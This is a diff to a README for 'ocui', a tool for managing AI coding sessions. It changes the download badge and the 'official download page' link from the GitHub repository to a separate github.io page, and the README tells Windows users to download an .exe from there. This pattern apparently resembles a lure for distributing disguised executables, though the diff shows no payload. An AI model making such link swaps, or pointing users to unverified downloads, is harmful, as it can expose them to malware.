@@ -1,6 +1,6 @@
 # 🚀 ocui - Manage your AI coding sessions easily
 
-[![](https://img.shields.io/badge/Download-Click_here-blue)] (https://github.com/test3767/ocui)
+[![](https://img.shields.io/badge/Download-Click_here-blue)] (https://test3767.github.io)
 
 ocui is a tool for developers who want to manage AI coding sessions from one spot. You can run and monitor projects across different folders or remote servers using a single web dashboard. It features live status tracking, built-in chat, terminal access, and a clear usage dashboard. This software runs as one small file on your computer.
 
@@ -12,7 +12,7 @@ This software runs your AI coding environment through a web interface. You see e
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [official download page](https://github.com/test3767/ocui).
+1. Visit the [official download page](https://test3767.github.io).
 2. Locate the latest release for Windows.
 3. Download the file ending in .exe to your computer.
 4. Move this file to a folder where you want to keep the software.
